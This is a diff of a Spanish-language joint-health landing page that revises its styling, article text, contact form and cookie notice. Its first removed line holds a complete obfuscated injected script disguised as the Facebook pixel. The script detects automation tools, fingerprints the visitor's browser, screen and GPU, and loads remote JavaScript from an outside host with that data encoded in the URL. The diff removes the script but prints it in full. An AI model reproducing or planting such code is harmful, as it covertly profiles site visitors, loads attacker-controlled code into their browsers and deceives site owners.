@@ -1,42 +1,48 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<script>var HCVRMDJVJ=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="https://sp1.micenice.pro/kl/?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Información completa sobre la salud articular, ejercicios y consejos para mantener articulaciones saludables">
-    <meta name="keywords" content="salud articular, articulaciones sanas, ejercicios articulares, dolor articular, artritis, prevención">
-    <meta name="author" content="Centro de Salud Articular">
-    <title>Salud Articular - Cuida tus Articulaciones</title>
+    <meta name="description" content="Guía completa sobre articulaciones saludables, ejercicios, nutrición y consejos prácticos para mantener la salud articular">
+    <meta name="keywords" content="articulaciones saludables, salud articular, ejercicios para articulaciones, nutrición articular, dolor articular">
+    <meta name="author" content="Expertos en Salud Articular">
+    <title>Articulaciones Saludables: Guía Completa para el Cuidado y Mantenimiento</title>
     <style>
-        /* Reset CSS */
+        /* Fuentes personalizadas */
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Open+Sans:wght@400;600&display=swap');
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Fuentes personalizadas */
-        @import url('https://fonts.googleapis.com/css2?family=Raleway:wght@400;600;700&display=swap');
-
-        body {
-            font-family: 'Raleway', sans-serif;
-            line-height: 1.6;
-            color: #333;
-            background-color: #f5f5f5;
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --text-color: #333;
+            --light-gray: #f5f6fa;
         }
 
-        /* Estilos del encabezado */
+        body {
+            font-family: 'Open Sans', sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: #ffffff;
+        }
+
         header {
-            background: linear-gradient(135deg, #2c3e50, #3498db);
+            background-color: var(--primary-color);
             color: white;
             padding: 2rem 1rem;
             text-align: center;
         }
 
-        .header-content {
-            max-width: 1200px;
-            margin: 0 auto;
+        h1, h2, h3, h4, h5, h6 {
+            font-family: 'Montserrat', sans-serif;
+            margin: 1.5rem 0;
+            color: var(--primary-color);
         }
 
         h1 {
@@ -44,100 +50,82 @@
             margin-bottom: 1rem;
         }
 
-        /* Navegación */
-        nav {
-            background-color: #2c3e50;
-            padding: 1rem;
-        }
-
-        nav ul {
-            list-style: none;
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 2rem;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        nav a {
-            color: white;
-            text-decoration: none;
-            font-weight: 600;
-            transition: color 0.3s;
-        }
-
-        nav a:hover {
-            color: #3498db;
-        }
-
-        /* Contenido principal */
-        main {
-            max-width: 1200px;
-            margin: 2rem auto;
-            padding: 0 1rem;
-        }
-
-        section {
-            background: white;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-
         h2 {
-            color: #2c3e50;
-            margin-bottom: 1.5rem;
             font-size: 2rem;
+            border-bottom: 2px solid var(--secondary-color);
+            padding-bottom: 0.5rem;
         }
 
         h3 {
-            color: #3498db;
-            margin: 1.5rem 0 1rem;
             font-size: 1.5rem;
+            color: var(--secondary-color);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .article-content {
+            padding: 2rem 0;
         }
 
         p {
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
         }
 
-        .img-container {
+        .image-container {
             margin: 2rem 0;
             text-align: center;
         }
 
-        .img-container img {
+        .image-container img {
             max-width: 100%;
             height: auto;
             border-radius: 8px;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .image-caption {
+            margin-top: 1rem;
+            font-style: italic;
+            color: #666;
         }
 
         /* Formulario de contacto */
         .contact-form {
-            display: grid;
-            gap: 1rem;
+            background-color: var(--light-gray);
+            padding: 2rem;
+            border-radius: 8px;
+            margin: 2rem 0;
         }
 
         .form-group {
-            display: grid;
-            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
         }
 
         input, textarea {
+            width: 100%;
             padding: 0.8rem;
             border: 1px solid #ddd;
-            border-radius: 5px;
+            border-radius: 4px;
             font-family: inherit;
         }
 
         button {
-            background-color: #3498db;
+            background-color: var(--secondary-color);
             color: white;
             padding: 1rem 2rem;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
             font-weight: 600;
             transition: background-color 0.3s;
@@ -147,141 +135,182 @@
             background-color: #2980b9;
         }
 
-        /* Cookie banner */
-        #cookie-banner {
+        /* Cookie Notice */
+        .cookie-notice {
             position: fixed;
             bottom: 0;
             left: 0;
             right: 0;
-            background-color: rgba(44, 62, 80, 0.95);
+            background-color: rgba(0,0,0,0.9);
             color: white;
             padding: 1rem;
             text-align: center;
             display: none;
         }
 
-        #cookie-banner.show {
+        .cookie-notice.show {
             display: block;
         }
 
-        #cookie-banner button {
+        .cookie-notice button {
             margin-left: 1rem;
             padding: 0.5rem 1rem;
         }
 
-        /* Footer */
-        footer {
-            background-color: #2c3e50;
-            color: white;
-            padding: 2rem 1rem;
-            margin-top: 3rem;
-        }
-
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-        }
-
-        /* Responsive */
+        /* Responsive Design */
         @media (max-width: 768px) {
             h1 {
                 font-size: 2rem;
             }
 
             h2 {
-                font-size: 1.75rem;
+                font-size: 1.5rem;
             }
 
             h3 {
                 font-size: 1.25rem;
             }
 
-            nav ul {
-                flex-direction: column;
-                align-items: center;
-                gap: 1rem;
+            .container {
+                padding: 0 15px;
             }
+        }
 
-            section {
-                padding: 1.5rem;
-            }
+        footer {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 2rem 0;
+            margin-top: 3rem;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            padding: 0 1rem;
+        }
+
+        .footer-section {
+            margin-bottom: 1rem;
+        }
+
+        .footer-section h4 {
+            color: white;
+            margin-bottom: 1rem;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 0.5rem;
+        }
+
+        .footer-section a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .footer-section a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <header>
-        <div class="header-content">
-            <h1>Centro de Salud Articular</h1>
-            <p>Cuida tus articulaciones para una vida activa y saludable</p>
+        <div class="container">
+            <h1>Articulaciones Saludables: Tu Guía Completa</h1>
+            <p>Descubre cómo mantener tus articulaciones en óptimo estado</p>
         </div>
     </header>
 
-    <nav>
-        <ul>
-            <li><a href="#inicio">Inicio</a></li>
-            <li><a href="#prevencion">Prevención</a></li>
-            <li><a href="#ejercicios">Ejercicios</a></li>
-            <li><a href="#nutricion">Nutrición</a></li>
-            <li><a href="#contacto">Contacto</a></li>
-        </ul>
-    </nav>
+    <main class="container">
+        <article class="article-content">
+            <h2>Introducción a la Salud Articular</h2>
+            <p>Las articulaciones son componentes fundamentales de nuestro sistema músculo-esquelético que permiten el movimiento y la flexibilidad de nuestro cuerpo. Su salud es crucial para mantener una vida activa y libre de dolores.</p>
 
-    <main>
-        <section id="inicio">
-            <h2>Bienvenidos a nuestro Centro de Salud Articular</h2>
-            <div class="img-container">
-                <img src="images/chess1.jpg" alt="Centro de salud articular" width="800" height="400">
+            <div class="image-container">
+                <img src="images/chess1.jpg" alt="Anatomía de las articulaciones">
+                <p class="image-caption">Estructura anatómica de una articulación saludable</p>
             </div>
-            <p>En nuestro centro especializado, nos dedicamos a proporcionar información y tratamientos integrales para mantener la salud de sus articulaciones. Nuestro enfoque combina la medicina moderna con técnicas probadas para asegurar su bienestar.</p>
-        </section>
 
-        <section id="prevencion">
-            <h2>Prevención de Problemas Articulares</h2>
-            <div class="img-container">
-                <img src="images/chess2.jpg" alt="Ejercicios de prevención" width="800" height="400">
-            </div>
-            <h3>Tips Diarios</h3>
-            <p>Mantener una buena salud articular requiere atención diaria y hábitos saludables. Aquí encontrará consejos prácticos para prevenir problemas articulares.</p>
-            <div class="img-container">
-                <img src="images/chess3.jpg" alt="Tips para la salud articular" width="800" height="400">
-            </div>
-        </section>
+            <h2>Anatomía de las Articulaciones</h2>
+            <p>Las articulaciones son estructuras complejas compuestas por varios elementos: cartílago, líquido sinovial, ligamentos y tendones. Cada uno cumple una función específica en el movimiento y la estabilidad articular.</p>
 
-        <section id="ejercicios">
-            <h2>Ejercicios Recomendados</h2>
-            <div class="img-container">
-                <img src="images/chess4.jpg" alt="Ejercicios para articulaciones" width="800" height="400">
-            </div>
-            <h3>Rutina Diaria</h3>
-            <p>Los ejercicios específicos para las articulaciones son fundamentales para mantener la movilidad y reducir el dolor. Presentamos una serie de ejercicios seguros y efectivos.</p>
-            <div class="img-container">
-                <img src="images/chess5.jpg" alt="Rutina de ejercicios" width="800" height="400">
-            </div>
-        </section>
+            <h3>Tipos de Articulaciones</h3>
+            <p>Existen diferentes tipos de articulaciones en nuestro cuerpo, cada una con características únicas:</p>
+            <p>• Articulaciones sinoviales (como la rodilla y el codo)<br>
+            • Articulaciones fibrosas (como las del cráneo)<br>
+            • Articulaciones cartilaginosas (como las de la columna vertebral)</p>
 
-        <section id="nutricion">
+            <div class="image-container">
+                <img src="images/chess2.jpg" alt="Tipos de articulaciones">
+                <p class="image-caption">Diferentes tipos de articulaciones en el cuerpo humano</p>
+            </div>
+
             <h2>Nutrición para Articulaciones Saludables</h2>
-            <div class="img-container">
-                <img src="images/chess6.jpg" alt="Nutrición articular" width="800" height="400">
-            </div>
-            <h3>Alimentos Recomendados</h3>
-            <p>Una alimentación adecuada es crucial para mantener articulaciones sanas. Descubra los mejores alimentos y suplementos para su salud articular.</p>
-            <div class="img-container">
-                <img src="images/chess7.jpg" alt="Alimentos saludables" width="800" height="400">
-            </div>
-        </section>
+            <p>Una alimentación adecuada es fundamental para mantener la salud articular. Los nutrientes esenciales incluyen:</p>
+            <p>• Colágeno<br>
+            • Vitamina C<br>
+            • Omega-3<br>
+            • Calcio<br>
+            • Vitamina D</p>
 
-        <section id="contacto">
-            <h2>Contacto</h2>
-            <div class="img-container">
-                <img src="images/chess8.jpg" alt="Contacto" width="800" height="400">
+            <div class="image-container">
+                <img src="images/chess3.jpg" alt="Alimentos saludables para las articulaciones">
+                <p class="image-caption">Alimentos ricos en nutrientes para la salud articular</p>
             </div>
+
+            <h2>Ejercicios para Fortalecer las Articulaciones</h2>
+            <p>El ejercicio regular es esencial para mantener la flexibilidad y fuerza de las articulaciones. Algunos ejercicios recomendados incluyen:</p>
+
+            <div class="image-container">
+                <img src="images/chess4.jpg" alt="Ejercicios para articulaciones">
+                <p class="image-caption">Ejercicios recomendados para la salud articular</p>
+            </div>
+
+            <h3>Ejercicios de Bajo Impacto</h3>
+            <p>Los ejercicios de bajo impacto son ideales para mantener las articulaciones saludables sin someterlas a estrés excesivo:</p>
+            <p>• Natación<br>
+            • Yoga<br>
+            • Tai Chi<br>
+            • Caminata<br>
+            • Ciclismo</p>
+
+            <div class="image-container">
+                <img src="images/chess5.jpg" alt="Ejercicios de bajo impacto">
+                <p class="image-caption">Actividades físicas suaves para el cuidado articular</p>
+            </div>
+
+            <h2>Prevención de Lesiones Articulares</h2>
+            <p>La prevención es clave para mantener articulaciones saludables. Algunos consejos importantes incluyen:</p>
+
+            <div class="image-container">
+                <img src="images/chess6.jpg" alt="Prevención de lesiones">
+                <p class="image-caption">Técnicas de prevención de lesiones articulares</p>
+            </div>
+
+            <h2>Tratamientos y Terapias</h2>
+            <p>Existen diversos tratamientos y terapias para mantener y recuperar la salud articular:</p>
+
+            <div class="image-container">
+                <img src="images/chess7.jpg" alt="Tratamientos articulares">
+                <p class="image-caption">Diferentes opciones de tratamiento para problemas articulares</p>
+            </div>
+
+            <h2>Consejos para el Día a Día</h2>
+            <p>Pequeños cambios en la rutina diaria pueden tener un gran impacto en la salud articular:</p>
+
+            <div class="image-container">
+                <img src="images/chess8.jpg" alt="Consejos diarios">
+                <p class="image-caption">Hábitos saludables para el cuidado de las articulaciones</p>
+            </div>
+
+            <h2>Contacto</h2>
             <form class="contact-form">
                 <div class="form-group">
-                    <label for="nombre">Nombre completo:</label>
+                    <label for="nombre">Nombre:</label>
                     <input type="text" id="nombre" name="nombre" required>
                 </div>
                 <div class="form-group">
@@ -294,30 +323,48 @@
                 </div>
                 <button type="submit">Enviar mensaje</button>
             </form>
-        </section>
+        </article>
     </main>
 
     <footer>
-        <div class="footer-content">
-            <div>
-                <h3>Política de Privacidad</h3>
-                <p>Nos comprometemos a proteger su privacidad y datos personales de acuerdo con las leyes vigentes.</p>
+        <div class="container footer-content">
+            <div class="footer-section">
+                <h4>Política de Privacidad</h4>
+                <p>Nuestra política de privacidad describe cómo recopilamos, usamos y protegemos su información personal.</p>
+                <a href="#privacy">Leer más</a>
             </div>
-            <div>
-                <h3>Términos y Condiciones</h3>
-                <p>Al utilizar este sitio web, usted acepta nuestros términos y condiciones de uso.</p>
+            <div class="footer-section">
+                <h4>Términos y Condiciones</h4>
+                <p>Al usar este sitio, usted acepta nuestros términos y condiciones de uso.</p>
+                <a href="#terms">Leer más</a>
             </div>
-            <div>
-                <h3>Contacto</h3>
-                <p>Email: info@saludarticular.com</p>
-                <p>Teléfono: +34 900 123 456</p>
+            <div class="footer-section">
+                <h4>Contacto</h4>
+                <ul>
+                    <li>Email: info@articulacionessaludables.com</li>
+                    <li>Teléfono: +34 900 123 456</li>
+                </ul>
             </div>
         </div>
     </footer>
 
-    <div id="cookie-banner" class="show">
-        <p>Este sitio web utiliza cookies para mejorar su experiencia. Al continuar navegando, acepta nuestra política de cookies.</p>
-        <button onclick="document.getElementById('cookie-banner').style.display='none'">Aceptar</button>
+    <div class="cookie-notice" id="cookieNotice">
+        <p>Este sitio utiliza cookies para mejorar su experiencia. Al continuar navegando, acepta su uso.</p>
+        <button onclick="acceptCookies()">Aceptar</button>
     </div>
+
+    <script>
+        // Simple Cookie Notice Script
+        window.onload = function() {
+            if (!localStorage.getItem('cookiesAccepted')) {
+                document.getElementById('cookieNotice').classList.add('show');
+            }
+        }
+
+        function acceptCookies() {
+            localStorage.setItem('cookiesAccepted', 'true');
+            document.getElementById('cookieNotice').classList.remove('show');
+        }
+    </script>
 </body>
 </html>
